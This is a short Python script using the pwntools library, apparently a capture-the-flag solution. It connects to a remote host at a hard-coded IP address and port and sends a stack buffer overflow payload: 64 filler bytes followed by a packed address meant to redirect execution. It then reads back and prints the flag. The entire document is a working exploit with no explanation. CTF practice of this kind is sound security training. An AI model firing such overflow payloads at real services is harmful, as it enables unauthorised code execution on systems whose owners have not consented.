from pwn import *
address = "159.65.13.76"
port = 63001

con = remote(address, port)
payload = b"A" * 64 + p32(0x08048670)
con.sendline(payload)
flag = con.recvline()
print(flag)
